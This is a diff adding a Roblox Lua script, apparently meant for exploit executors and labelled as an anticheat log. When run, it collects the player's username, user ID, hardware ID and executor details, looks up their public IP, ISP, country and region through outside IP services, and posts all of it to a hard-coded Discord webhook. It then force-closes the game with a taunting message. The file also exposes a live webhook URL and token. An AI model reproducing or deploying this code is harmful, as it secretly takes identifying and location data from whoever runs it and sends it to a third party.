@@ -1,0 +1,100 @@
+local players = game:GetService("Players")
+local hwid = gethwid()
+local which, ver = identifyexecutor()
+if ver == nil then
+	ver = _VERSION
+end
+
+local local_player = players.LocalPlayer
+local network_data = {
+	query = "Could not retrieve",
+	as = "Could not retrieve",
+	countryCode = "Could not retrieve",
+	region = "Could not retrieve",
+	proxy = "Could not retrieve",
+}
+
+local http = (syn and syn.request) or (http and http.request) or request
+local a
+local function log_information(...)
+	local httpService = game:GetService("HttpService")
+	local data_string = "```ansi\n\27[2;30m\27[2;30m\27[2;36m\27[2;35m\27[2;36m// Identifier Data\27[0m\27[2;35m\27[0m\27[2;36m\27[0m\27[2;30m\27[0m\27[2;30m\27[0m\n\27[2;34mUsername\27[0m: \27[2;37m%s\27[0m\n\27[2;36m\27[2;34mUser Id \27[0m\27[2;36m\27[0m: \27[2;37m%s\27[0m\n\27[2;36m\27[2;34mExecutor\27[0m\27[2;36m\27[0m:\27[2;37m %s\27[0m\n\27[2;36m\27[2;34mHWID    \27[0m\27[2;36m\27[0m: \27[2;37m%s\27[0m\n\n\27[2;30m\27[2;36m// Location Data\27[0m\27[2;30m\27[0m\n\27[2;34mIP      \27[0m: \27[2;37m%s\27[0m\n\27[2;35m\27[2;36m\27[2;34mISP     \27[0m\27[2;36m\27[0m\27[2;35m\27[0m: \27[2;37m%s\27[0m\n\27[2;34mCountry \27[0m: \27[2;37m%s\27[0m\n\27[2;34mRegion  \27[0m: \27[2;37m%s\27[0m\n\27[2;34mProxy(\27[2;33m?\27[2;36m\27[2;34m)\27[2;36m\27[0m: \27[2;37m%s\27[0m\n\n\27[2;30m\27[2;36m// Action Data\27[0m\27[2;30m\27[0m\n\27[2;36m\27[2;31mTrigger \27[0m\27[2;36m\27[0m: \27[2;37m%s\n\27[2;31mDeviceID\27[0m\27[2;37m\27[0m: \27[2;37m%s\n\27[0m\27[2;37m\27[2;31mPayload \27[0m\27[2;37m\27[0m: \27[2;37m%s\27[0m\n\27[2;31mServer  \27[0m: \27[2;37m%s\27[0m\n```"
+
+	local date = string.gsub(os.date("%Y/%m/%d", timestamp), "/", "-")
+	local current_time = os.date("%H:%M:%S")
+	local formatted = ("%sT%s.000Z"):format(date, current_time)
+
+	local encodedData = httpService:JSONEncode({
+		["content"] = "",
+		["tts"] = false,
+		["embeds"] = {
+			{
+				["id"] = 212753958,
+				["fields"] = {},
+				["author"] = {
+					["name"] = "Anticheat Log - Enviornment Flag"
+				},
+				["color"] = 11823465,
+				["footer"] = {
+					["text"] = "TX#2991341515"
+				},
+				["timestamp"] = formatted,
+				["description"] = (data_string:format(...))
+			}
+		},
+		["components"] = {},
+		["actions"] = {},
+		["flags"] = 0
+	})
+
+	request({
+		Url = "https://discord.com/api/webhooks/1527174934596419715/r1MLJakcT2Tfkn0PivhU0IUKx7cZCwTHG_0qIr0yFdNUA_Mah8pZCyKwgdENsvNXRtiO",
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = encodedData
+	})
+	task.wait(0.5)
+	game:Shutdown()
+	messagebox("plz uninstall exploit😟😟😟🙁", "from david bazscuki", bit32.bor(0x00000030, 0x00000000, 0x00000100))
+end
+
+if http then
+	local actual_ip = http({
+		Url = "https://api.ipify.org",
+		Method = "GET"
+	})
+
+	if actual_ip then
+		local response = http({
+			Url = "http://ip-api.com/json/"..actual_ip.Body.."?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
+			Method = "GET"
+		})
+
+		if response and response.Body then
+			network_data = game:GetService("HttpService"):JSONDecode(response.Body)
+		end
+	end
+end
+
+function Round(n, decimals)
+	decimals = decimals or 0
+	return math.floor(n * 10 ^ decimals) / 10 ^ decimals
+end
+
+log_information(
+	local_player.Name,
+	players:GetUserIdFromNameAsync(local_player.Name),
+	which.." (version: "..ver..")",
+	hwid,
+	tostring(network_data.query),
+	network_data.as,
+	network_data.countryCode,
+	network_data.region,
+	tostring(network_data.proxy),
+	_G.Reason,
+	string.lower(Round(tick()-os.clock())),
+	_G.Action,
+	game.JobId
+)
